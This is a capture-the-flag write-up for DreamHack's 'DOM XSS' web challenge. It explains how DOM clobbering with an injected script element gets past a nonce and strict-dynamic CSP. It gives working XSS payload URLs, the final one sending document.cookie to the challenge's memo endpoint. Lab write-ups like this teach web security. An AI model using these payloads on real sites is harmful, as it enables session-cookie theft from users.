# DOM XSS — DreamHack

> **Room / Challenge:** DOM XSS (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** DOM XSS (web)
- **Link**: `https://dreamhack.io/wargame/challenges/438`
- **Level:** `2`
- **Date:** `13-11-2025`

---

## Goal

Leveraging DOM XSS to obtain the flag

## My Solution

This is the updated version of [CSP Bypass](https://dreamhack.io/wargame/challenges/435). The CSP policy is:

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
    nonce = os.urandom(16).hex()
    return response
```

Initially, I think that I should craft a payload that should bypass the CSP however the real vulnerability is in the `/vuln` template:

```html
{% extends "base.html" %} {% block title %}Index{% endblock %} {% block head %}
{{ super() }}
<style type="text/css">
  .important {
    color: #336699;
  }
</style>
{% endblock %} {% block content %}

<script nonce="{{" nonce }}>
  window.addEventListener("load", function () {
    var name_elem = document.getElementById("name");
    name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
  });
</script>
{{ param | safe }}
<pre id="name"></pre>
{% endblock %}
```

You can see here the value after `#` is taken to the `pre` with id name:

```html
<script nonce="{{" nonce }}>
  window.addEventListener("load", function () {
    var name_elem = document.getElementById("name");
    name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
  });
</script>
```

So we can trick this code by add a element with id name before that pre:

```
http://host3.dreamhack.games:19403/vuln?param=%3Cspan%20id=%22name%22%3Easd%3C/span%3E#James
```

![Guide image](./screenshots/1.png)

Now we can just add Javascript command after `#` and add `//` after that to comment the ` is my name!` to prevent syntax errors.

```
http://host3.dreamhack.games:19403/vuln?param=%3Cscript%20id=%22name%22%3E%3C/script%3E#alert('XSS');//
```

![Guide image](./screenshots/2.png)

This works because the `<script>` with nonce executes the code, insert our command `alert('XSS');//` to our inserted `<script>` with id name, then that `<script>` executes which will bypass the CSP policy. Final payload to get the flag:

```
http://host3.dreamhack.games:19403/vuln?param=%3Cscript%20id=%22name%22%3E%3C/script%3E#location.href='http://localhost/memo?memo'+document.cookie;//
```

```
Param: <script id="name"></script>
Name: location.href='/memo?memo='+document.cookie//
```

![Guide image](./screenshots/3.png)
